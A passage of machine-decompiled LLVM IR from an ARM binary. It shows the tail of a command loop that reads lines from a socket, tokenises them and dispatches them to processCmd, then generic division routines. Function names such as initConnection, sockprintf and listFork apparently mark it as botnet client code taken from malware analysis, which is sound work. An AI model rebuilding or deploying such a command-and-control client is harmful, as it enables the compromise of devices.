  %v2_116f8 = add i32 %v3_116f0, %v19_10be4
  %v2_116fc = add i32 %v2_116f8, -600
  %v1_11700 = inttoptr i32 %v2_116fc to i32*
  %v2_11700 = load i32, i32* %v1_11700, align 4
  store i32 %v2_11700, i32* @r4, align 4
  %v3_1170c = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_11714 = add i32 %v3_1170c, 1
  %v0_11718 = load i32, i32* @r4, align 4
  store i32 %v1_11714, i32* @r2, align 4
  %v2_11728 = inttoptr i32 %v0_11718 to i8*
  %v3_11728 = call i32 @__GI_memset(i8* %v2_11728, i32 0)
  %v2_11748 = load i32, i32* %v1_11700, align 4
  %v4_11758 = call i32 @strcpy(i32 %v2_11748, i8* nonnull %stack_var_-36.049)
  %v1_11760 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_11768

dec_label_pc_11768:                               ; preds = %dec_label_pc_11690, %dec_label_pc_116a0
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_11690 ], [ %v1_11760, %dec_label_pc_116a0 ]
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_238c4.984 to i32), i32* @r1, align 4
  %v2_11770 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_238c4.984 to i32))
  %v2_11780 = icmp eq i32 %v2_11770, 0
  br i1 %v2_11780, label %dec_label_pc_11788, label %dec_label_pc_11690

dec_label_pc_11788:                               ; preds = %dec_label_pc_11768, %dec_label_pc_11664
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_11664 ], [ %stack_var_-40.0, %dec_label_pc_11768 ]
  %v3_11794 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_117a0 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_117a0, label %dec_label_pc_117fc.outer, label %dec_label_pc_117b8.lr.ph

dec_label_pc_117b8.lr.ph:                         ; preds = %dec_label_pc_11788
  br label %dec_label_pc_117b8

dec_label_pc_117b8:                               ; preds = %dec_label_pc_117b8.lr.ph, %dec_label_pc_117b8
  %storemerge15127 = phi i32 [ 1, %dec_label_pc_117b8.lr.ph ], [ %v1_117e4, %dec_label_pc_117b8 ]
  %v3_117c4 = mul i32 %storemerge15127, 4
  %v2_117cc = add i32 %v3_117c4, %v19_10be4
  %v2_117d0 = add i32 %v2_117cc, -600
  %v1_117d4 = inttoptr i32 %v2_117d0 to i32*
  %v2_117d4 = load i32, i32* %v1_117d4, align 4
  store i32 %v2_117d4, i32* @r0, align 4
  %v0_117dc = call i32 @free()
  %v1_117e4 = add nuw nsw i32 %storemerge15127, 1
  %v5_117f8 = icmp slt i32 %v1_117e4, %stack_var_-40.1.lcssa
  br i1 %v5_117f8, label %dec_label_pc_117b8, label %dec_label_pc_117fc.outer

dec_label_pc_117fc.outer:                         ; preds = %dec_label_pc_117b8, %dec_label_pc_1137c, %dec_label_pc_1155c, %dec_label_pc_11788, %dec_label_pc_113d8, %dec_label_pc_10f8c
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_10f8c ], [ %stack_var_-96.1, %dec_label_pc_113d8 ], [ %stack_var_-96.1, %dec_label_pc_11788 ], [ %stack_var_-96.1, %dec_label_pc_1155c ], [ %stack_var_-96.1, %dec_label_pc_1137c ], [ %stack_var_-96.1, %dec_label_pc_117b8 ]
  br label %dec_label_pc_117fc

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117fc.outer, %dec_label_pc_11308
  %v2_11800 = load i32, i32* @global_var_2d604.55, align 4
  %v5_1181c = call i32 @recvLine(i32 %v2_11800, i8* %v4_1181c, i32 4096, i32 %v2_1180c)
  %v3_1182c = icmp eq i32 %v5_1181c, -1
  br i1 %v3_1182c, label %dec_label_pc_10f70.outer, label %dec_label_pc_11238

; uselistorder directives
  uselistorder i32 %v5_1181c, { 1, 0 }
  uselistorder i32 %storemerge15127, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_11770, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_11528, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_114f0, { 1, 2, 0 }
  uselistorder i32 %v2_11468, { 1, 2, 0 }
  uselistorder i8* %v5_11420, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_1141c, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_11354, { 1, 2, 0 }
  uselistorder i1 %v9_1126c, { 1, 0 }
  uselistorder i32 %v3_11280, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_111b8, { 1, 0 }
  uselistorder i32 %v3_111ec, { 1, 2, 0, 3 }
  uselistorder i32 %v3_11160, { 1, 0 }
  uselistorder i32 %v1_11144, { 1, 0 }
  uselistorder i32 %v5_11088, { 1, 0 }
  uselistorder i32 %v1_11018, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_11574, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_1181c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_1180c, { 6, 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %v3_10e80, { 1, 0, 2 }
  uselistorder i32 %v2_10de4, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_238c4.984 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 116, 115, 23, 22, 21, 20, 19, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24 }
  uselistorder i32 ()* @listFork, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2d60c.73, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_3388c.76, { 0, 2, 3, 4, 5, 6, 7, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @sockprintf, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 29, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_33880.317, { 0, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* @global_var_2d604.55, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32)* @sleep, { 4, 3, 2, 1, 0 }
  uselistorder i32 30, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder [2 x i8]* @global_var_23850.953, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_23850.953 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 1, 2, 3, 4, 5, 6, 22, 23 }
  uselistorder label %dec_label_pc_117fc.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_117b8, { 1, 0 }
  uselistorder label %dec_label_pc_11768, { 1, 0 }
  uselistorder label %dec_label_pc_11690, { 1, 0 }
  uselistorder label %dec_label_pc_11664, { 1, 0 }
  uselistorder label %dec_label_pc_1162c, { 1, 0 }
  uselistorder label %dec_label_pc_11504, { 1, 0 }
  uselistorder label %dec_label_pc_114e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_114d0, { 1, 0 }
  uselistorder label %dec_label_pc_11450, { 1, 0 }
  uselistorder label %dec_label_pc_113b8, { 1, 0 }
  uselistorder label %dec_label_pc_1137c, { 1, 0 }
  uselistorder label %dec_label_pc_112a4, { 1, 0 }
  uselistorder label %dec_label_pc_1122c, { 1, 0 }
  uselistorder label %dec_label_pc_1119c, { 1, 0 }
  uselistorder label %dec_label_pc_1106c, { 1, 0 }
  uselistorder label %dec_label_pc_10f80, { 1, 0 }
  uselistorder label %dec_label_pc_10f70.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10f54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10ec8, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10da0, { 1, 0 }
  uselistorder label %dec_label_pc_10d2c, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1188c = add i32 %arg2, -1
  %v7_1188c = icmp eq i32 %arg2, 1
  br i1 %v7_1188c, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_11890 = load i32, i32* @r0, align 4
  ret i32 %v2_11890

bb80:                                             ; preds = %entry
  %v2_1188c = icmp eq i32 %arg2, 0
  br i1 %v2_1188c, label %dec_label_pc_11974, label %dec_label_pc_11898

dec_label_pc_11898:                               ; preds = %bb80
  %v0_11898 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_11898, %arg2
  br i1 %tmp, label %dec_label_pc_118a0, label %dec_label_pc_1192c

dec_label_pc_118a0:                               ; preds = %dec_label_pc_11898
  %v2_118a0 = and i32 %v1_1188c, %arg2
  %v4_118a0 = icmp eq i32 %v2_118a0, 0
  br i1 %v4_118a0, label %dec_label_pc_11938, label %dec_label_pc_118a8

dec_label_pc_118a8:                               ; preds = %dec_label_pc_118a0
  %v3_118a8 = icmp ult i32 %arg2, 536870912
  br i1 %v3_118a8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_118a8
  %v4_118ac = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_118a8, %.thread
  %v0_118cc.pr36.ph = phi i32 [ %v4_118ac, %.thread ], [ %arg2, %dec_label_pc_118a8 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_118a8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_118cc.pr36 = phi i32 [ %v4_118c0, %bb83 ], [ %v0_118cc.pr36.ph, %.preheader.preheader ]
  %v1_118c4 = phi i32 [ %v4_118c4, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_118b8 = icmp ugt i32 %v0_118cc.pr36, 268435455
  br i1 %v2_118b8, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_118ccthread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_118bc = icmp ult i32 %v0_118cc.pr36, %v0_11898
  br i1 %v4_118bc, label %bb82, label %dec_label_pc_118ccthread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_118c0 = and i32 %v0_118cc.pr36, 268435456
  %v3_118c0 = icmp eq i32 %v2_118c0, 0
  %v4_118c0 = mul i32 %v0_118cc.pr36, 16
  br i1 %v3_118c0, label %bb83, label %dec_label_pc_118cc.loopexit

bb83:                                             ; preds = %bb82
  %v2_118c4 = and i32 %v1_118c4, 268435456
  %v3_118c4 = icmp eq i32 %v2_118c4, 0
  %v4_118c4 = mul i32 %v1_118c4, 16
  br i1 %v3_118c4, label %.preheader, label %dec_label_pc_118ccthread-pre-split.loopexit.loopexit

dec_label_pc_118ccthread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_118d848.ph = phi i32 [ %v1_118c4, %bb81 ], [ %v4_118c4, %bb83 ]
  %v0_118cc.pr38.ph = phi i32 [ %v0_118cc.pr36, %bb81 ], [ %v4_118c0, %bb83 ]
  br label %dec_label_pc_118ccthread-pre-split.loopexit

dec_label_pc_118ccthread-pre-split.loopexit:      ; preds = %dec_label_pc_118ccthread-pre-split.loopexit.loopexit, %.thread2
  %v1_118d848 = phi i32 [ %v1_118c4, %.thread2 ], [ %v1_118d848.ph, %dec_label_pc_118ccthread-pre-split.loopexit.loopexit ]
  %v0_118cc.pr38 = phi i32 [ %v0_118cc.pr36, %.thread2 ], [ %v0_118cc.pr38.ph, %dec_label_pc_118ccthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_118ccthread-pre-split

dec_label_pc_118ccthread-pre-split:               ; preds = %dec_label_pc_118ccthread-pre-split.loopexit, %bb85
  %v1_118d846 = phi i32 [ %v1_118d848, %dec_label_pc_118ccthread-pre-split.loopexit ], [ %v3_118d8, %bb85 ]
  %v0_118cc.pr = phi i32 [ %v0_118cc.pr38, %dec_label_pc_118ccthread-pre-split.loopexit ], [ %v3_118d4, %bb85 ]
  br label %dec_label_pc_118cc

dec_label_pc_118cc.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_118cc

dec_label_pc_118cc:                               ; preds = %dec_label_pc_118cc.loopexit, %dec_label_pc_118ccthread-pre-split
  %v1_118d8 = phi i32 [ %v1_118d846, %dec_label_pc_118ccthread-pre-split ], [ %v1_118c4, %dec_label_pc_118cc.loopexit ]
  %v1_118d4 = phi i32 [ %v0_118cc.pr, %dec_label_pc_118ccthread-pre-split ], [ %v4_118c0, %dec_label_pc_118cc.loopexit ]
  %v2_118cc = icmp slt i32 %v1_118d4, 0
  br i1 %v2_118cc, label %dec_label_pc_118e0, label %bb84

bb84:                                             ; preds = %dec_label_pc_118cc
  %v4_118d0 = icmp ult i32 %v1_118d4, %v0_11898
  br i1 %v4_118d0, label %bb85, label %dec_label_pc_118e0

bb85:                                             ; preds = %bb84
  %v3_118d4 = mul i32 %v1_118d4, 2
  %v2_118d8 = icmp slt i32 %v1_118d8, 0
  %v3_118d8 = mul i32 %v1_118d8, 2
  br i1 %v2_118d8, label %dec_label_pc_118e0, label %dec_label_pc_118ccthread-pre-split

dec_label_pc_118e0:                               ; preds = %bb84, %dec_label_pc_118cc, %bb85
  %v2_118ec59 = phi i32 [ %v3_118d8, %bb85 ], [ %v1_118d8, %bb84 ], [ %v1_118d8, %dec_label_pc_118cc ]
  %v1_118e451 = phi i32 [ %v3_118d4, %bb85 ], [ %v1_118d4, %bb84 ], [ %v1_118d4, %dec_label_pc_118cc ]
  br label %dec_label_pc_118e4

dec_label_pc_118e4:                               ; preds = %.thread11, %dec_label_pc_118e0
  %v1_11918 = phi i32 [ %v4_11918, %.thread11 ], [ %v2_118ec59, %dec_label_pc_118e0 ]
  %v1_118ec = phi i32 [ %v0_11924, %.thread11 ], [ 0, %dec_label_pc_118e0 ]
  %v1_1191c = phi i32 [ %v4_1191c, %.thread11 ], [ %v1_118e451, %dec_label_pc_118e0 ]
  %v1_118e8 = phi i32 [ %v0_11914, %.thread11 ], [ %v0_11898, %dec_label_pc_118e0 ]
  %v3_118e4 = icmp ult i32 %v1_118e8, %v1_1191c
  br i1 %v3_118e4, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_118e4
  %v3_118e8 = sub i32 %v1_118e8, %v1_1191c
  %v3_118ec = or i32 %v1_118ec, %v1_11918
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_118e4, %bb86
  %v1_118f4 = phi i32 [ %v1_118e8, %dec_label_pc_118e4 ], [ %v3_118e8, %bb86 ]
  %v1_118f8 = phi i32 [ %v1_118ec, %dec_label_pc_118e4 ], [ %v3_118ec, %bb86 ]
  %v4_118f0 = udiv i32 %v1_1191c, 2
  %v6_118f0 = icmp ult i32 %v1_118f4, %v4_118f0
  br i1 %v6_118f0, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_118f4 = urem i32 %v1_1191c, 2
  %v4_118f4 = icmp eq i32 %v3_118f4, 0
  %v6_118f4 = sub i32 %v1_118f4, %v4_118f0
  br i1 %v4_118f4, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_118f8 = udiv i32 %v1_11918, 2
  %v6_118f8 = or i32 %v1_118f8, %v5_118f8
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_11900 = phi i32 [ %v6_118f4, %bb87 ], [ %v1_118f4, %.thread7 ], [ %v6_118f4, %bb88 ]
  %v1_11904 = phi i32 [ %v1_118f8, %bb87 ], [ %v1_118f8, %.thread7 ], [ %v6_118f8, %bb88 ]
  %v4_118fc = udiv i32 %v1_1191c, 4
  %v6_118fc = icmp ult i32 %v1_11900, %v4_118fc
  br i1 %v6_118fc, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_11900 = and i32 %v1_1191c, 2
  %v4_11900 = icmp eq i32 %v3_11900, 0
  %v6_11900 = sub i32 %v1_11900, %v4_118fc
  br i1 %v4_11900, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11904 = udiv i32 %v1_11918, 4
  %v6_11904 = or i32 %v1_11904, %v5_11904
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_1190c = phi i32 [ %v6_11900, %bb89 ], [ %v1_11900, %.thread8 ], [ %v6_11900, %bb90 ]
  %v1_11910 = phi i32 [ %v1_11904, %bb89 ], [ %v1_11904, %.thread8 ], [ %v6_11904, %bb90 ]
  %v4_11908 = udiv i32 %v1_1191c, 8
  %v6_11908 = icmp ult i32 %v1_1190c, %v4_11908
  br i1 %v6_11908, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_1190c = and i32 %v1_1191c, 4
  %v4_1190c = icmp eq i32 %v3_1190c, 0
  %v6_1190c = sub i32 %v1_1190c, %v4_11908
  br i1 %v4_1190c, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_11910 = udiv i32 %v1_11918, 8
  %v6_11910 = or i32 %v1_11910, %v5_11910
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_11924 = phi i32 [ %v1_11910, %bb91 ], [ %v1_11910, %.thread9 ], [ %v6_11910, %bb92 ]
  %v0_11914 = phi i32 [ %v6_1190c, %bb91 ], [ %v1_1190c, %.thread9 ], [ %v6_1190c, %bb92 ]
  %v2_11914 = icmp eq i32 %v0_11914, 0
  br i1 %v2_11914, label %dec_label_pc_11924, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_11918, 16
  br i1 %tmp140, label %dec_label_pc_11924, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_11918 = udiv i32 %v1_11918, 16
  %v4_1191c = udiv i32 %v1_1191c, 16
  br label %dec_label_pc_118e4

dec_label_pc_11924:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_11924

dec_label_pc_1192c:                               ; preds = %dec_label_pc_11898
  %v9_11898 = icmp eq i32 %v0_11898, %arg2
  %. = zext i1 %v9_11898 to i32
  ret i32 %.

dec_label_pc_11938:                               ; preds = %dec_label_pc_118a0
  %v2_11938 = icmp ugt i32 %arg2, 65535
  br i1 %v2_11938, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_11938
  %v2_1193c = and i32 %arg2, 32768
  %v3_1193c = icmp eq i32 %v2_1193c, 0
  %v4_1193c = udiv i32 %arg2, 65536
  br i1 %v3_1193c, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_11938
  %v0_1194865 = phi i32 [ %arg2, %dec_label_pc_11938 ], [ %v4_1193c, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_1194c = phi i32 [ %v0_1194865, %.thread16 ], [ %v4_1193c, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_11948 = icmp ugt i32 %v1_1194c, 255
  br i1 %v2_11948, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_1194c = and i32 %v1_1194c, 128
  %v3_1194c = icmp eq i32 %v2_1194c, 0
  %v4_1194c = udiv i32 %v1_1194c, 256
  br i1 %v3_1194c, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_11950 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_1195c = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_11950, %bb100 ]
  %v1_11958 = phi i32 [ %v1_1194c, %bb98 ], [ %v4_1194c, %bb99 ], [ %v4_1194c, %bb100 ]
  %v2_11954 = icmp ugt i32 %v1_11958, 15
  br i1 %v2_11954, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_11958 = and i32 %v1_11958, 8
  %v3_11958 = icmp eq i32 %v2_11958, 0
  %v4_11958 = udiv i32 %v1_11958, 16
  br i1 %v3_11958, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_1195c = add nsw i32 %v1_1195c, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_11964 = phi i32 [ %v1_1195c, %.thread17 ], [ %v1_1195c, %bb101 ], [ %v2_1195c, %bb102 ]
  %v5_11968 = phi i32 [ %v1_11958, %.thread17 ], [ %v4_11958, %bb101 ], [ %v4_11958, %bb102 ]
  %v2_11960 = icmp ugt i32 %v5_11968, 3
  %v7_11960 = icmp eq i32 %v5_11968, 4
  %v2_11964 = xor i1 %v7_11960, true
  %v3_11964 = and i1 %v2_11960, %v2_11964
  br i1 %v3_11964, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_11964 = add nsw i32 %v4_11964, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_11968 = phi i32 [ %v4_11964, %.thread18 ], [ %v5_11964, %bb103 ]
  %v2_11968 = xor i1 %v2_11960, true
  %v3_11968 = or i1 %v7_11960, %v2_11968
  br i1 %v3_11968, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_11968 = udiv i32 %v5_11968, 2
  %v9_11968 = add i32 %v4_11968, %v8_11968
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_1196c = phi i32 [ %v4_11968, %bb104 ], [ %v9_11968, %bb105 ]
  %v6_1196c = lshr i32 %v0_11898, %v1_1196c
  ret i32 %v6_1196c

dec_label_pc_11974:                               ; preds = %bb80
  %v0_11974 = load i32, i32* @lr, align 4
  %v0_11978 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11974)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11968, { 1, 0 }
  uselistorder i1 %v7_11960, { 1, 0 }
  uselistorder i32 %v4_11958, { 1, 0 }
  uselistorder i32 %v1_11958, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1194c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1194c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1193c, { 1, 0 }
  uselistorder i32 %v0_11914, { 1, 0 }
  uselistorder i32 %v4_11908, { 1, 0 }
  uselistorder i32 %v1_11910, { 1, 2, 0 }
  uselistorder i32 %v4_118fc, { 1, 0 }
  uselistorder i32 %v1_11904, { 1, 2, 0 }
  uselistorder i32 %v4_118f0, { 1, 0 }
  uselistorder i32 %v1_118f8, { 1, 2, 0 }
  uselistorder i32 %v1_1191c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_118ec, { 1, 0 }
  uselistorder i32 %v1_11918, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_118d8, { 1, 0 }
  uselistorder i32 %v3_118d4, { 1, 0 }
  uselistorder i32 %v1_118d4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_118d8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_118c4, { 1, 0 }
  uselistorder i32 %v4_118c0, { 2, 1, 0 }
  uselistorder i32 %v1_118c4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_118cc.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_11898, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_11924, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_118e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_118ccthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11988 = udiv i32 %arg1, %arg2
  ret i32 %v2_11988
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1199c = add i32 %arg2, -1
  %v2_1199c = icmp eq i32 %arg2, 0
  br i1 %v2_1199c, label %dec_label_pc_11a58, label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %entry
  %v7_1199c = icmp eq i32 %arg2, 1
  br i1 %v7_1199c, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_119a4
  %v1_119a4 = load i32, i32* @r0, align 4
  %v10_119a4 = icmp eq i32 %v1_119a4, %arg2
  br i1 %v10_119a4, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_119a4, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_119a4 = icmp ult i32 %v1_119a4, %arg2
  br i1 %v4_119a4, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_119ac = and i32 %v1_1199c, %arg2
  %v8_119ac = icmp eq i32 %v6_119ac, 0
  br i1 %v8_119ac, label %.thread67, label %dec_label_pc_119bc.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_119b0 = phi i32 [ %v1_119a4, %bb75 ], [ 0, %.thread65 ]
  %v3_119b0 = and i32 %v1_119b0, %v1_1199c
  br label %bb76

dec_label_pc_119bc.preheader:                     ; preds = %bb75
  %v2_119bc99 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_119bc99, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_11a4c, %bb74, %bb89, %bb84, %dec_label_pc_11a1c, %.thread67
  %v5_119b4 = phi i32 [ %v1_119a4, %bb74 ], [ %v3_119b0, %.thread67 ], [ %v1_119f8.v6_119f8.v6_11a00.v6_11a08, %dec_label_pc_11a1c ], [ 0, %bb84 ], [ %v1_11a50, %dec_label_pc_11a4c ], [ %v2_11a4c, %bb89 ]
  ret i32 %v5_119b4

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_119bc.preheader
  %v0_119d0.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_119bc.preheader ], [ %v4_119c4, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_119bc.preheader ], [ %v2_119c811, %.thread1.thread9 ]
  br label %dec_label_pc_119d0thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_119bc.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_119c811, %.thread1.thread9 ], [ 0, %dec_label_pc_119bc.preheader ]
  %v0_119d0.pr33100 = phi i32 [ %v4_119c4, %.thread1.thread9 ], [ %arg2, %dec_label_pc_119bc.preheader ]
  %v4_119c0 = icmp ult i32 %v0_119d0.pr33100, %v1_119a4
  br i1 %v4_119c0, label %bb78, label %dec_label_pc_119d0thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_119c4 = and i32 %v0_119d0.pr33100, 268435456
  %v3_119c4 = icmp eq i32 %v2_119c4, 0
  %v4_119c4 = mul i32 %v0_119d0.pr33100, 16
